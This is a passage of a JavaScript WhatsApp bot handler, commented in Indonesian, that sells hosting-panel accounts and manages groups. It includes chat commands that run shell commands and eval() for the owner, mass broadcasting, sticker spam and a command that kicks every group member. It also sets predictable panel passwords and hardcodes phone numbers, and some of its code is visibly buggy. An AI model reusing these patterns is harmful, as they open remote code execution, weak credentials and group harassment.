                    m.reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
                }
            }
                break;

            case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gbb": case "10gb": case "unli": {
                if (!isPremium && !isOwner) return KleeReply("Maaf Kamu Belum Terdaftar Di Database Resseler Silahkan Untuk Menghubungi Owner")
                if (!jangan) return KleeReply("Group Belum Terdaftar")

                if (global.apikey.length < 1) return reply("Apikey Tidak Ditemukan!")
                if (!args[0]) return reply(example("nama,6283XXX"))
                if (!text.split(",")) return reply(example("nama,6283XXX"))
                var buyyer = text.split(",")[0].toLowerCase()
                if (!buyyer) return reply(example("nama,6283XXX"))
                var ceknya = text.split(",")[1]
                if (!ceknya) return reply(example("nama,6283XXX"))
                var client = text.split(",")[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                var check = await Klee.onWhatsApp(ceknya)
                if (!check[0].exists) return reply("Nomor Buyyer Tidak Valid!")
                global.panel2 = [buyyer, client]
                var ram
                var disknya
                var cpu
                if (command == "1gb") {
                    ram = "1125"
                    disknya = "1125"
                    cpu = "40"
                } else if (command == "2gb") {
                    ram = "2125"
                    disknya = "2125"
                    cpu = "60"
                } else if (command == "3gb") {
                    ram = "3125"
                    disknya = "3125"
                    cpu = "80"
                } else if (command == "4gb") {
                    ram = "4125"
                    disknya = "4125"
                    cpu = "100"
                } else if (command == "5gb") {
                    ram = "5125"
                    disknya = "5125"
                    cpu = "120"
                } else if (command == "6gb") {
                    ram = "6125"
                    disknya = "6125"
                    cpu = "140"
                } else if (command == "7gb") {
                    ram = "7125"
                    disknya = "7125"
                    cpu = "160"
                } else if (command == "8gb") {
                    ram = "8125"
                    disknya = "8125"
                    cpu = "180"
                } else if (command == "9gb") {
                    ram = "9124"
                    disknya = "9125"
                    cpu = "200"
                } else if (command == "10gb") {
                    ram = "10125"
                    disknya = "10125"
                    cpu = "220"
                } else {
                    ram = "0"
                    disknya = "0"
                    cpu = "0"
                }
                if (!jangan) return KleeReply("Grup Belum Terdaftar")
                let username = global.panel2[0].toLowerCase()
                let email = username + "@gmail.com"
                let name = capital(username)
                let password = username + "1221"
                let f = await fetch(domain + "/api/application/users", {
                    "method": "POST",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey
                    },
                    "body": JSON.stringify({
                        "email": email,
                        "username": username.toLowerCase(),
                        "first_name": name,
                        "last_name": "Server",
                        "language": "en",
                        "password": password
                    })
                })
                let data = await f.json();
                if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
                let user = data.attributes
                let desc = tanggal(Date.now())
                let usr_id = user.id
                let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
                    "method": "GET",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey
                    }
                })
                let data2 = await f1.json();
                let startup_cmd = data2.attributes.startup
                let f2 = await fetch(domain + "/api/application/servers", {
                    "method": "POST",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey,
                    },
                    "body": JSON.stringify({
                        "name": name,
                        "description": desc,
                        "user": usr_id,
                        "egg": parseInt(egg),
                        "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
                        "startup": startup_cmd,
                        "environment": {
                            "INST": "npm",
                            "USER_UPLOAD": "0",
                            "AUTO_UPDATE": "0",
                            "CMD_RUN": "npm start"
                        },
                        "limits": {
                            "memory": ram,
                            "swap": 0,
                            "disk": disknya,
                            "io": 500,
                            "cpu": cpu
                        },
                        "feature_limits": {
                            "databases": 5,
                            "backups": 5,
                            "allocations": 5
                        },
                        deploy: {
                            locations: [parseInt(loc)],
                            dedicated_ip: false,
                            port_range: [],
                        },
                    })
                })
                let result = await f2.json()
                if (result.errors) return reply(JSON.stringify(result.errors[0], null, 2))
                let server = result.attributes
                await reply(`*Berhasil Membuat Akun Panel ✅*\n\n* *User ID :* ${user.id}\n* *Server ID :* ${server.id}\n* *Nama :* ${name} Server\n* *Ram :* ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}\n* *CPU :* ${cpu == "0" ? "Unlimited" : cpu + "%"}\n* *Storage :* ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}\n* *Created :* ${desc}\n\nData Akun Sudah Dikirim Ke Nomor ${global.panel2[1].split('@')[0]}`)
                var datapanel = `Hai @${global.panel2[1].split`@`[0]}
*BERIKUT DATA AKUN PANEL ANDA*

* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Link Login :* ${global.domain}

Catatan Tambahan
> dilarang bagi-bagi panel secara gratis
> dilarang menyebarkan data anda
> dilarang menyebarkan Link login
> info selengkapnya hubungi owner panel
`
                Klee.sendMessage(global.panel2[1], { text: datapanel }, { quoted: Klee.chat })
            }
                break

            case "1gbb": case "2gbb": case "3gbb": case "4gbb": case "5gbb": case "6gbb": case "7gbb": case "8gbb": case "9gbbb": case "10gbb": case "unlii": {
                if (!isReseller && !isOwner) return KleeReply("Maaf Kamu Belum Terdaftar Di Database Resseler Silahkan Untuk Menghubungi Owner")
                if (!jangan2) return KleeReply("Group Belum Terdaftar")

                if (global.apikey.length < 1) return reply("Apikey Tidak Ditemukan!")
                if (!args[0]) return reply(example("nama,6283XXX"))
                if (!text.split(",")) return reply(example("nama,6283XXX"))
                var buyyer = text.split(",")[0].toLowerCase()
                if (!buyyer) return reply(example("nama,6283XXX"))
                var ceknya = text.split(",")[1]
                if (!ceknya) return reply(example("nama,6283XXX"))
                var client = text.split(",")[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                var check = await Klee.onWhatsApp(ceknya)
                if (!check[0].exists) return reply("Nomor Buyyer Tidak Valid!")
                global.panel2 = [buyyer, client]
                var ram
                var disknya
                var cpu
                if (command == "1gbb") {
                    ram = "1125"
                    disknya = "1125"
                    cpu = "40"
                } else if (command == "2gbb") {
                    ram = "2125"
                    disknya = "2125"
                    cpu = "60"
                } else if (command == "3gbb") {
                    ram = "3125"
                    disknya = "3125"
                    cpu = "80"
                } else if (command == "4gbb") {
                    ram = "4125"
                    disknya = "4125"
                    cpu = "100"
                } else if (command == "5gbb") {
                    ram = "5125"
                    disknya = "5125"
                    cpu = "120"
                } else if (command == "6gbb") {
                    ram = "6125"
                    disknya = "6125"
                    cpu = "140"
                } else if (command == "7gbb") {
                    ram = "7125"
                    disknya = "7125"
                    cpu = "160"
                } else if (command == "8gbb") {
                    ram = "8125"
                    disknya = "8125"
                    cpu = "180"
                } else if (command == "9gbb") {
                    ram = "9124"
                    disknya = "9125"
                    cpu = "200"
                } else if (command == "10gbb") {
                    ram = "10125"
                    disknya = "10125"
                    cpu = "220"
                } else {
                    ram = "0"
                    disknya = "0"
                    cpu = "0"
                }
                if (!jangan2) return KleeReply("Grup Belum Terdaftar")
                let username = global.panel2[0].toLowerCase()
                let email = username + "@gmail.com"
                let name = capital(username)
                let password = username + "1221"
                let f = await fetch(domain2 + "/api/application/users", {
                    "method": "POST",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey2
                    },
                    "body": JSON.stringify({
                        "email": email,
                        "username": username.toLowerCase(),
                        "first_name": name,
                        "last_name": "Server",
                        "language": "en",
                        "password": password
                    })
                })
                let data = await f.json();
                if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
                let user = data.attributes
                let desc = tanggal(Date.now())
                let usr_id = user.id
                let f1 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
                    "method": "GET",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey2
                    }
                })
                let data2 = await f1.json();
                let startup_cmd = data2.attributes.startup
                let f2 = await fetch(domain2 + "/api/application/servers", {
                    "method": "POST",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey2,
                    },
                    "body": JSON.stringify({
                        "name": name,
                        "description": desc,
                        "user": usr_id,
                        "egg": parseInt(egg),
                        "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
                        "startup": startup_cmd,
                        "environment": {
                            "INST": "npm",
                            "USER_UPLOAD": "0",
                            "AUTO_UPDATE": "0",
                            "CMD_RUN": "npm start"
                        },
                        "limits": {
                            "memory": ram,
                            "swap": 0,
                            "disk": disknya,
                            "io": 500,
                            "cpu": cpu
                        },
                        "feature_limits": {
                            "databases": 5,
                            "backups": 5,
                            "allocations": 5
                        },
                        deploy: {
                            locations: [parseInt(loc)],
                            dedicated_ip: false,
                            port_range: [],
                        },
                    })
                })
                let result = await f2.json()
                if (result.errors) return reply(JSON.stringify(result.errors[0], null, 2))
                let server = result.attributes
                await reply(`*Berhasil Membuat Akun Panel ✅*\n\n* *User ID :* ${user.id}\n* *Server ID :* ${server.id}\n* *Nama :* ${name} Server\n* *Ram :* ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}\n* *CPU :* ${cpu == "0" ? "Unlimited" : cpu + "%"}\n* *Storage :* ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}\n* *Created :* ${desc}\n\nData Akun Sudah Dikirim Ke Nomor ${global.panel2[1].split('@')[0]}`)
                var datapanel = `Hai @${global.panel2[1].split`@`[0]}
*BERIKUT DATA AKUN PANEL ANDA*

* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Link Login :* ${global.domain2}

Catatan Tambahan
> dilarang bagi-bagi panel secara gratis
> dilarang menyebarkan data anda
> dilarang menyebarkan Link login
> info selengkapnya hubungi owner panel
`
                Klee.sendMessage(global.panel2[1], { text: datapanel }, { quoted: Klee.chat })
            }
                break

            case 'addgc':
                if (!isOwner) return m.reply('Maaf, command ini hanya untuk pemilik.')
                if (!isGroup) return m.reply("Khusus Owner")
                pler.push(m.chat)
                fs.writeFileSync('./all/database/idgrup.json', JSON.stringify(pler))
                m.reply(`${command} Success Active To Create panel`)
                break
            case "startbc":
                bijiasu = budy.slice(9)
                function delay(ms) {
                    return new Promise(resolve => setTimeout(resolve, ms));
                }
                if (!isOwner) return m.reply('Maaf, command ini hanya untuk pemilik.')
                if (!args[0]) {
                    m.reply("Sertakan Textnya")
                }
                let gcall1 = Object.values(await Klee.groupFetchAllParticipating().catch(_ => null))
                let listgca = []
                await gcall1.forEach((u, i) => {
                    listgca.push(u.id)
                })
                let bijikudanil = JSON.parse(fs.readFileSync('./all/database/idblgrup.json', 'utf8'));
                listgca = listgca.filter(item => !bijikudanil.includes(item));
                for (let i = 0; i < listgca.length; i++) {
                    try {
                        await Klee.sendMessage(listgca[i], {
                            text: bijiasu
                        })
                    } catch { }
                    await delay(500);       // Delay 5 detik (5000 ms) sebelum melanjutkan ke iterasi berikutnya
                }
                m.reply("success")
                break;
            case 'addblgc':
                if (!isOwner) return m.reply('Maaf, command ini hanya untuk pemilik.')
                if (!args[0]) {
                    m.reply("Sertakan id group yang mau di blacklist!!!")
                }
                bijipler.push(args[0])
                fs.writeFileSync('./all/database/idblgrup.json', JSON.stringify(bijipler))
                m.reply(`${command} Berhasil menambahkan Grub Ini Ke Daftar Hitam Broadcast ✅`)
                break
            case "listgc":
                if (!isOwner) return m.reply('Maaf, command ini hanya untuk pemilik.')
                let gcall = Object.values(await Klee.groupFetchAllParticipating().catch(_ => null))
                let listgc = '\n'
                await gcall.forEach((u, i) => {
                    listgc += `*${i + 1}.* ${u.subject}\n* *ID :* ${u.id}\n* *Total Member :* ${u.participants.length} Member\n* *Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n* *Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
                })
                m.reply(`${listgc}`)
                break;
            case 'addgc2':
                if (!isOwner) return m.reply('Maaf, command ini hanya untuk pemilik.')
                if (!isGroup) return m.reply("Khusus Owner")
                plerr.push(m.chat)
                fs.writeFileSync('./all/database/idgrup2.json', JSON.stringify(pler))
                m.reply(`${command} Success Active To Crate panel Server 2\nKleeMD - OfficiaL✅`)
                break
            case "delpanel": case "hapuspanel": {
                if (!isOwner) return KleeReply(msg.owner);
                if (global.apikey.length < 1) return reply("Apikey Tidak Ditemukan!");
                if (!args[0]) return reply(example("idservernya\n\nuntuk melihat id server ketik *.listpanel*"));

                let sections = [];
                let pageServer = 1;
                let foundServer = false;

                // Pencarian Server dengan Pagination
                while (!foundServer) {
                    let f = await fetch(`${domain}/api/application/servers?page=${pageServer}`, {
                        "method": "GET",
                        "headers": {
                            "Accept": "application/json",
                            "Content-Type": "application/json",
                            "Authorization": "Bearer " + apikey
                        }
                    });
                    let result = await f.json();
                    if (!result.data || result.data.length === 0) break; // Jika tidak ada data, hentikan

                    let servers = result.data;
                    for (let server of servers) {
                        let s = server.attributes;
                        if (args[0] == s.id.toString()) {
                            sections.push(s.name.toLowerCase());
                            // Hapus server
                            await fetch(`${domain}/api/application/servers/${s.id}`, {
                                "method": "DELETE",
                                "headers": {
                                    "Accept": "application/json",
                                    "Content-Type": "application/json",
                                    "Authorization": "Bearer " + apikey
                                }
                            });
                            foundServer = true;
                            break;
                        }
                    }

                    if (!foundServer) pageServer++; // Lanjutkan ke halaman berikutnya jika belum ditemukan
                }

                if (sections.length > 0) {
                    // Pencarian User dengan Pagination
                    let pageUser = 1;
                    let foundUser = false;

                    while (!foundUser) {
                        let cek = await fetch(`${domain}/api/application/users?page=${pageUser}`, {
                            "method": "GET",
                            "headers": {
                                "Accept": "application/json",
                                "Content-Type": "application/json",
                                "Authorization": "Bearer " + apikey
                            }
                        });
                        let res2 = await cek.json();

                        if (!res2.data || res2.data.length === 0) break; // Jika tidak ada data, hentikan

                        let users = res2.data;
                        for (let user of users) {
                            let u = user.attributes;
                            if (sections.includes(u.username)) {
                                // Hapus user
                                await fetch(`${domain}/api/application/users/${u.id}`, {
                                    "method": "DELETE",
                                    "headers": {
                                        "Accept": "application/json",
                                        "Content-Type": "application/json",
                                        "Authorization": "Bearer " + apikey
                                    }
                                });
                                foundUser = true;
                                break;
                            }
                        }

                        if (!foundUser) pageUser++; // Lanjutkan ke halaman berikutnya jika belum ditemukan
                    }

                    reply(`Berhasil Menghapus Akun Panel *${capital(sections[0])}*`);
                } else {
                    reply("*ID Server/User* Tidak Ditemukan");
                }
            }
                break;
            case "delpanel2": case "hapuspanel2": {
                if (!isOwner) return KleeReply(msg.owner);
                if (global.apikey2.length < 1) return reply("Apikey Tidak Ditemukan!");
                if (!args[0]) return reply(example("idservernya\n\nuntuk melihat id server ketik *.listpanel*"));

                let sections = [];
                let pageServer = 1;
                let foundServer = false;

                // Pencarian Server dengan Pagination
                while (!foundServer) {
                    let f = await fetch(`${domain2}/api/application/servers?page=${pageServer}`, {
                        "method": "GET",
                        "headers": {
                            "Accept": "application/json",
                            "Content-Type": "application/json",
                            "Authorization": "Bearer " + apikey2
                        }
                    });
                    let result = await f.json();
                    if (!result.data || result.data.length === 0) break; // Jika tidak ada data, hentikan

                    let servers = result.data;
                    for (let server of servers) {
                        let s = server.attributes;
                        if (args[0] == s.id.toString()) {
                            sections.push(s.name.toLowerCase());
                            // Hapus server
                            await fetch(`${domain2}/api/application/servers/${s.id}`, {
                                "method": "DELETE",
                                "headers": {
                                    "Accept": "application/json",
                                    "Content-Type": "application/json",
                                    "Authorization": "Bearer " + apikey2
                                }
                            });
                            foundServer = true;
                            break;
                        }
                    }

                    if (!foundServer) pageServer++; // Lanjutkan ke halaman berikutnya jika belum ditemukan
                }

                if (sections.length > 0) {
                    // Pencarian User dengan Pagination
                    let pageUser = 1;
                    let foundUser = false;

                    while (!foundUser) {
                        let cek = await fetch(`${domain2}/api/application/users?page=${pageUser}`, {
                            "method": "GET",
                            "headers": {
                                "Accept": "application/json",
                                "Content-Type": "application/json",
                                "Authorization": "Bearer " + apikey2
                            }
                        });
                        let res2 = await cek.json();

                        if (!res2.data || res2.data.length === 0) break; // Jika tidak ada data, hentikan

                        let users = res2.data;
                        for (let user of users) {
                            let u = user.attributes;
                            if (sections.includes(u.username)) {
                                // Hapus user
                                await fetch(`${domain2}/api/application/users/${u.id}`, {
                                    "method": "DELETE",
                                    "headers": {
                                        "Accept": "application/json",
                                        "Content-Type": "application/json",
                                        "Authorization": "Bearer " + apikey2
                                    }
                                });
                                foundUser = true;
                                break;
                            }
                        }

                        if (!foundUser) pageUser++; // Lanjutkan ke halaman berikutnya jika belum ditemukan
                    }

                    reply(`Berhasil Menghapus Akun Panel *${capital(sections[0])}*`);
                } else {
                    reply("*ID Server/User* Tidak Ditemukan");
                }
            }
                break;
            case ".spamsticker": {
                // Periksa apakah pengirim adalah owner bot
                if (!isOwner(m.sender)) {
                    m.reply("Fitur ini hanya dapat digunakan oleh owner bot.");
                    return;
                }

                const folderPath = './stickers'; // Path folder stiker
                const spamCount = 50; // Jumlah maksimal spam stiker

                try {
                    // Membaca semua file dalam folder stickers
                    const files = fs.readdirSync(folderPath);

                    // Filter hanya file dengan ekstensi .webp atau yang sesuai dengan stiker WhatsApp
                    const stickerFiles = files.filter(file => file.endsWith('.thumb.webp'));

                    if (stickerFiles.length === 0) {
                        m.reply("Tidak ada stiker di folder 'stickers'.");
                        return;
                    }

                    for (let i = 0; i < spamCount; i++) {
                        // Pilih file stiker secara acak
                        const randomFile = stickerFiles[Math.floor(Math.random() * stickerFiles.length)];
                        const randomStickerPath = path.join(folderPath, randomFile); // Mendapatkan path lengkap stiker

                        // Mengirim stiker acak dari file lokal
                        await Klee.sendStimg(m.chat, randomStickerPath, m, { packname: global.packname });

                        console.log(`Stiker ke-${i + 1} dari ${randomStickerPath} telah dikirim!`);

                        // Menunggu sebentar sebelum mengirim stiker berikutnya (optional, untuk menghindari pemblokiran)
                        await new Promise(resolve => setTimeout(resolve, 2000)); // Delay 2 detik antar pengiriman

                        // Jika ingin menghentikan pengiriman setelah stiker ke-10, gunakan break
                        if (i >= 10) {
                            console.log("Pengiriman stiker dihentikan setelah 10 stiker.");
                            m.reply("Pengiriman stiker dihentikan setelah 10 stiker.");
                            break;
                        }
                    }

                    // Menampilkan pesan sukses setelah spam selesai
                    m.reply(`${spamCount} stiker telah dikirim!`);

                } catch (error) {
                    console.error("Gagal mengirim stiker:", error);
                    m.reply("Terjadi kesalahan saat mengirim stiker.");
                }
            }
                break;

            case "all": case "allkick": {
                if (!isGroup) return KleeReply(msg.group);
                if (!isBotAdmin) return KleeReply(msg.adminbot);
                if (!isAdmin && !isOwner) return KleeReply(msg.admin);

                try {
                    // Ambil semua anggota grup
                    const groupMetadata = await Klee.groupMetadata(m.chat);
                    const allMembers = groupMetadata.participants.map(p => p.id);
                    const botId = Klee.user.jid;
                    const ownerIds = ['6285710115864@s.whatsapp.net', '6285954071669@s.whatsapp.net', '6282177704519@s.whatsapp.net', '6281325556701@s.whatsapp.net']; // Tambahkan ID owner bot di sini

                    // Fungsi untuk mencoba mengeluarkan pengguna dengan mekanisme retry
                    const removeUser = async (user, retries = 3) => {
                        for (let attempt = 1; attempt <= retries; attempt++) {
                            try {
                                await Klee.groupParticipantsUpdate(m.chat, [user], 'remove');
                                console.log(`Berhasil mengeluarkan ${user}`);
                                break; // Keluar dari loop jika berhasil
                            } catch (err) {
                                if (err.toString().includes('rate-overlimit')) {
                                    console.warn(`Percobaan ke-${attempt} gagal untuk ${user} (rate-overlimit).`);
                                    if (attempt < retries) {
                                        await new Promise(resolve => setTimeout(resolve, 3000)); // Tunggu 3 detik sebelum mencoba lagi
                                    } else {
                                        console.error(`Gagal mengeluarkan ${user} setelah ${retries} percobaan.`);
                                    }
                                } else {
                                    console.error(`Error saat mengeluarkan ${user}:`, err.toString());
                                    break; // Keluar jika error bukan rate-overlimit
                                }
                            }
                        }
                    };

                    // Keluarkan semua anggota kecuali bot dan owner
                    for (let user of allMembers) {
                        if (user !== botId && !ownerIds.includes(user)) {
                            await removeUser(user);
                        }
                    }
                } catch (error) {
                    console.error(error);
                    reply("Terjadi kesalahan saat mencoba mengeluarkan anggota grup.");
                }
            }
                break;



            case "kik": case "kick": {
                if (!isGroup) return KleeReply(msg.group)
                if (!isBotAdmin) return KleeReply(msg.adminbot)
                if (!isAdmin && !isOwner) return KleeReply(msg.admin)
                if (text || m.quoted) {
                    let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    await Klee.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => Klee.sendMessage(m.chat, { text: `Berhasil Mengeluarkan @${users.split("@")[0]} Dari Grup Ini`, mentions: [`${users}`] }, { quoted: m })).catch((err) => reply(err.toString()))
                } else return reply(example('nomornya/@tag'))
            }
                break
            /*case "hidetag": case "z": case "h": {
            if (!isGroup) return KleeReply(msg.group)
            if (!isAdmin && !isOwner) return KleeReply(msg.admin)
            if (!m.quoted && !text) return reply(example("teksnya/replyteks"))
            var teks = m.quoted ? m.quoted.text : text
            var member = await groupMetadata.participants.map(e => e.id)
            Klee.sendMessage(m.chat, {text: teks, mentions: [...member]})
            }
            break*/
            case "tagall": case "tag": {
                if (!isGroup) return KleeReply(msg.group)
                if (!isAdmin && !isOwner) return KleeReply(msg.admin)
                if (!text) return reply(example("Pesannya"))
                var member = await groupMetadata.participants.map(e => e.id)
                var teks = ` ${text}\n\n`
                member.forEach(e => e !== m.sender ? teks += `@${e.split("@")[0]}\n` : '')
                Klee.sendMessage(m.chat, { text: teks, mentions: [...member] })
            }
                break

            default:
                if (budy.startsWith('$')) {
                    if (!isOwner) return
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return Klee.sendMessage(m.chat, { text: err.toString() }, { quoted: m })
                        if (stdout) return Klee.sendMessage(m.chat, { text: util.format(stdout) }, { quoted: m })
                    })
                }

                if (budy.startsWith(">")) {
                    if (!isOwner) return
                    try {
                        let evaled = await eval(text)
                        if (typeof evaled !== 'string') evaled = util.inspect(evaled)
                        Klee.sendMessage(m.chat, { text: util.format(evaled) }, { quoted: m })
                    } catch (e) {
                        Klee.sendMessage(m.chat, { text: util.format(e) }, { quoted: m })
                    }
                }

                if (budy.startsWith("=>")) {
                    if (!isOwner) return
                    try {
                        const evaling = await eval(`;(async () => { ${text} })();`);
                        return Klee.sendMessage(m.chat, { text: util.format(evaling) }, { quoted: m })
                    } catch (e) {
                        return Klee.sendMessage(m.chat, { text: util.format(e) }, { quoted: m })
                    }
                }

        }
    } catch (e) {
        console.log(e)
        Klee.sendMessage(`${owner}@s.whatsapp.net`, { text: `${util.format(e)}` })
    }
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})